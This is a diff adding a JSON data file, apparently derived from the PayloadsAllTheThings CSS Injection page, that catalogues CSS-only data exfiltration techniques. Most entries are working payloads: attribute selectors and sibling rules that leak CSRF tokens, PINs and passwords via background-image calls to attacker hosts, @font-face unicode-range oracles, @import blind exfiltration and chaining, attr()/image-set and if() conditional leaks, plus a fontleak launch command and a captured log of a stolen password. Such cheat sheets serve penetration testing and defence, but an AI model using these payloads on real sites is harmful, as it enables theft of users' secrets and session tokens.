@@ -1,0 +1,200 @@
+{
+  "category": "CSS Injection",
+  "source": "PayloadsAllTheThings/CSS Injection/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What is CSS Injection",
+      "language": "text",
+      "tags": ["methodology", "css-injection", "exfiltration"],
+      "body": "CSS Injection is a vulnerability where an application allows injecting untrusted CSS into a page. By manipulating styles and triggering network requests based on element attributes, you can exfiltrate sensitive data: CSRF tokens, PIN codes, OAuth tokens and other secrets.\n\nMain advantage: CSS is almost always allowed by CSP rules, whereas JavaScript is often blocked. So the attack works where XSS is impossible - exploitation goes through pure CSS, without JS."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Detection and exfiltration channels",
+      "language": "text",
+      "tags": ["methodology", "detection"],
+      "body": "CSS Selectors  attribute selectors ([value^=a]) match a value and load a background-image from your domain -> character leak.\n@import        import external styles from your server for blind exfiltration (Blind CSS Exfiltration).\n@font-face     unicode-range loads a font only if a specific character is present on the page -> character presence oracle.\nattr()         CSS function pulls an attribute value and substitutes it into a URL (image-set).\nLigatures      a custom font with ligatures changes element width -> detection via scrollbar / media query.\nConditionals   if() + CSS variables give logic right inside inline-style without an external stylesheet."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Attribute selectors - the basis of the technique",
+      "language": "css",
+      "tags": ["methodology", "selectors", "detection"],
+      "body": "input[value^=a]   (prefix) - value starts with \"a\".\ninput[value$=a]   (suffix) - value ends with \"a\".\ninput[value*=a]   (substring) - value contains \"a\"."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Where to look and how to exploit",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "- Any input that later gets rendered into <style> or into a style attribute.\n- Design themes, custom profile styles, HTML emails, previews.\n- Places where CSS is allowed but JS is forbidden (strict CSP).\n- The attack brute-forces the token character by character: you identify the first character -> update the payload for the second, and so on. Usually you need an iframe to reload the page with the new payload."
+    },
+
+    {
+      "subcategory": "Data theft via selectors",
+      "title": "Exfiltration via background-image",
+      "language": "css",
+      "tags": ["selectors", "exfiltration", "background-image"],
+      "body": "input[value^=\"TOKEN_012\"] {\n  background-image: url(http://attacker.example.com/?prefix=TOKEN_012);\n}"
+    },
+    {
+      "subcategory": "Data theft via selectors",
+      "title": "Exact value match (PIN / known value)",
+      "language": "css",
+      "tags": ["selectors", "exfiltration", "pin"],
+      "body": "input[name=\"pin\"][value=\"1234\"] {\n  background: url(https://[ATTACKER.DOMAIN.TLD]/log?pin=1234);\n}"
+    },
+    {
+      "subcategory": "Data theft via selectors",
+      "title": ":has() - styling a parent based on a child",
+      "language": "css",
+      "tags": ["selectors", "has", "exfiltration"],
+      "body": "div:has(input[value=\"1337\"]) {\n  background:url(/collectData?value=1337);\n}",
+      "meta": {
+        "tip": "The :has() pseudo-class lets you apply a style to a parent element based on its children - handy when the target input itself cannot carry a background."
+      }
+    },
+
+    {
+      "subcategory": "Character-by-character exfiltration",
+      "title": "The principle of character-by-character brute force",
+      "language": "text",
+      "tags": ["exfiltration", "bruteforce", "selectors"],
+      "body": "The token is brute-forced character by character. As soon as the first character is identified, the payload is updated to guess the second, and so on. Most often this requires an iframe that reloads the page with the new payload."
+    },
+    {
+      "subcategory": "Character-by-character exfiltration",
+      "title": "Hidden inputs - styling a neighboring element",
+      "language": "css",
+      "tags": ["selectors", "hidden-input", "sibling"],
+      "body": "input[name=\"csrf-token\"][value^=\"a\"] + input {\n  background: url(https://[ATTACKER.DOMAIN.TLD]/?q=a)\n}",
+      "meta": {
+        "tip": "You cannot apply a background-image to a hidden input directly. Use a sibling selector (+ or ~) to style a visible element that comes after the hidden input."
+      }
+    },
+    {
+      "subcategory": "Character-by-character exfiltration",
+      "title": "Speeding up the brute force - parallel prefix + suffix",
+      "language": "text",
+      "tags": ["selectors", "concurrency", "optimization"],
+      "body": "Use prefix and suffix selectors simultaneously to speed up guessing. Assign the prefix check to one property (for example, background), and the suffix check to another (for example, list-style-image or border-image)."
+    },
+
+    {
+      "subcategory": "@font-face unicode-range keylogger",
+      "title": "Character presence oracle via unicode-range",
+      "language": "html",
+      "tags": ["font-face", "unicode-range", "oracle"],
+      "body": "<style>\n@font-face{ font-family:poc; src: url(http://attacker.example.com/?A); /* fetched */ unicode-range:U+0041; }\n@font-face{ font-family:poc; src: url(http://attacker.example.com/?B); /* fetched too */ unicode-range:U+0042; }\n@font-face{ font-family:poc; src: url(http://attacker.example.com/?C); /* not fetched */ unicode-range:U+0043; }\n#sensitive-information{ font-family:poc; }\n</style>\n<p id=\"sensitive-information\">AB</p>",
+      "meta": {
+        "tip": "The unicode-range property allows a font to be used only for specific characters. If the character \"A\" is present on the page, the browser loads the font from /?A; if \"C\" is absent, no request is sent."
+      }
+    },
+    {
+      "subcategory": "@font-face unicode-range keylogger",
+      "title": "Limitations of the unicode-range technique",
+      "language": "text",
+      "tags": ["font-face", "limitations"],
+      "body": "- Does not distinguish repeated characters (\"AA\" triggers the request once).\n- Does not determine the order of characters.\n- Despite this, it is a very reliable oracle for checking character presence.\n- Chrome marked this as WontFix: issues.chromium.org/issues/40083029"
+    },
+
+    {
+      "subcategory": "CSRF token theft",
+      "title": "Leaking a CSRF token character by character",
+      "language": "css",
+      "tags": ["csrf", "exfiltration", "selectors"],
+      "body": "input[name=\"csrf-token\"][value^=\"a\"] + input {\n  background: url(https://[ATTACKER.DOMAIN.TLD]/?q=a)\n}",
+      "meta": {
+        "tip": "A CSRF token usually sits in a hidden input, so the background is attached to a neighboring visible input via +. By brute-forcing the prefix [value^=\"a\"], [value^=\"b\"]... we recover the token character by character."
+      }
+    },
+    {
+      "subcategory": "CSRF token theft",
+      "title": "Blind CSS Exfiltration via @import",
+      "language": "html",
+      "tags": ["import", "blind", "exfiltration"],
+      "body": "<style>@import url(http://[ATTACKER.DOMAIN.TLD]/staging?len=32);</style>\n<style>@import'//[ATTACKER.DOMAIN.TLD]'</style>",
+      "meta": {
+        "tip": "The Blind CSS Exfiltration technique: importing external styles triggers callbacks to your server. Frames do not always need to be reloaded to re-evaluate CSS - @import allows a delay, the browser will process the import and apply the new styles."
+      }
+    },
+    {
+      "subcategory": "CSRF token theft",
+      "title": "Sequential Import Chaining (SIC)",
+      "language": "text",
+      "tags": ["import", "sic", "exfiltration"],
+      "body": "SIC allows an attacker to chain several extraction steps without reloading the page:\n\n1. Inject a starting @import rule pointing to the staging payload.\n2. The staging payload keeps the connection open (long-polling) while it generates the next concrete payload.\n3. When a CSS rule matches (for example, a character is found via background-image) the browser makes a request.\n4. The server catches that request and generates the next @import rule, continuing the chain."
+    },
+
+    {
+      "subcategory": "Exploitation without JS",
+      "title": "Extracting an attribute via attr() + image-set",
+      "language": "css",
+      "tags": ["attr", "image-set", "exfiltration"],
+      "body": "input[name=\"password\"] {\n  background: image-set(attr(value))\n}",
+      "meta": {
+        "tip": "The CSS attr() function (see Advanced attr()) can pull an input's value. Inside image-set() the browser may try to interpret the attribute value as a URL. If the stylesheet is cross-domain, a relative URL is resolved against the stylesheet's origin, not the page's."
+      }
+    },
+    {
+      "subcategory": "Exploitation without JS",
+      "title": "Target HTML for attr() exfiltration",
+      "language": "html",
+      "tags": ["attr", "exfiltration", "target"],
+      "body": "<html>\n    <head>\n        <link rel=\"stylesheet\" href=\"http://attacker.local/index.css\">\n    </head>\n    <body>\n        <input type=\"text\" name=\"password\" value=\"supersecret\">\n    </body>\n</html>"
+    },
+    {
+      "subcategory": "Exploitation without JS",
+      "title": "Request on the attacker's server (attr() result)",
+      "language": "text",
+      "tags": ["attr", "exfiltration", "log"],
+      "body": "10.10.10.10 - - [15/Feb/2026 16:33:21] \"GET /supersecret HTTP/1.1\" 404 -"
+    },
+    {
+      "subcategory": "Exploitation without JS",
+      "title": "Inline Style Exfiltration via CSS conditionals",
+      "language": "html",
+      "tags": ["conditionals", "inline-style", "exfiltration"],
+      "body": "<div style='--val: attr(data-uid); --steal: if(style(--val:\"1\"): url(/1); else: if(style(--val:\"2\"): url(/2); else: if(style(--val:\"3\"): url(/3); else: if(style(--val:\"4\"): url(/4); else: if(style(--val:\"5\"): url(/5); else: if(style(--val:\"6\"): url(/6); else: if(style(--val:\"7\"): url(/7); else: if(style(--val:\"8\"): url(/8); else: if(style(--val:\"9\"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>",
+      "meta": {
+        "tip": "Advanced technique: if() and CSS variables let you run logic right inside the style attribute - without an external stylesheet. The example steals the data-uid attribute if it is in the range 1..10."
+      }
+    },
+    {
+      "subcategory": "Exploitation without JS",
+      "title": "Ligatures - leaking text nodes by width",
+      "language": "text",
+      "tags": ["ligatures", "fontleak", "exfiltration"],
+      "body": "The technique exploits custom fonts and ligatures. A ligature merges several characters into a single glyph. By creating a font where specific character sequences produce a ligature of enormous width, you can detect a change in layout.\n\n1. Create a custom font with ligatures for the target strings.\n2. With media queries or scrollbars, detect whether the rendered element width has changed.\n\nImportant: the CSS selector must match exactly one element on the target page."
+    },
+    {
+      "subcategory": "Exploitation without JS",
+      "title": "fontleak - launch and payload",
+      "language": "text",
+      "tags": ["ligatures", "fontleak", "tool"],
+      "body": "docker run -it --rm -p 4242:4242 -e BASE_URL=http://localhost:4242 ghcr.io/adrgs/fontleak:latest\n\n<style>@import url(\"http://localhost:4242/?selector=.secret&parent=head&alphabet=abcdef0123456789\");</style>"
+    },
+
+    {
+      "subcategory": "Tools",
+      "title": "Tools for CSS exfiltration",
+      "language": "table",
+      "tags": ["tools", "exfiltration"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Tool", "Purpose"],
+          "rows": [
+            ["hackvertor/blind-css-exfiltration", "Exfiltration of unknown pages via Blind CSS"],
+            ["PortSwigger/css-exfiltration", "Collection of CSS exfiltration techniques"],
+            ["cgvwzq/css-scrollbar-attack", "PoC for leaking text nodes via scrollbars"],
+            ["d0nutptr/sic", "Sequential Import Chaining for advanced exfiltration"],
+            ["adrgs/fontleak", "Fast text exfiltration using only CSS and ligatures"]
+          ]
+        }
+      }
+    }
+  ]
+}
